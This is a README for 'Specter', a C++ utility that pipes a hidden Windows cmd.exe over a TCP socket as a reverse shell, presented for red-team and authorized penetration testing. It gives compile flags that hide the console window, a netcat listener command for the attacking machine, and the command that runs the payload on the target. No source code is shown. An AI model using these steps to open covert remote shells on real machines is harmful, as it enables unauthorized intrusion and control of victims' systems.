# Specter

A lightweight, unmanaged C++ socket utility for remote command execution. 

Designed for red-team environments and authorized penetration testing. Specter bypasses the standard Windows console host and directly pipes standard input/output handles from a hidden `cmd.exe` process over an active TCP socket connection.

## Compilation

Requires MSVC or MinGW (must link against `ws2_32.lib`).

**GCC/MinGW:**
```bash
g++ -O3 main.cpp -o Specter.exe -lws2_32 -mwindows
```

## Usage

Start a TCP listener on the attacking machine (e.g., using Netcat):
```bash
nc -lvnp 4444
```

Execute the payload on the target machine:
```cmd
.\Specter.exe <IP> <PORT>
```
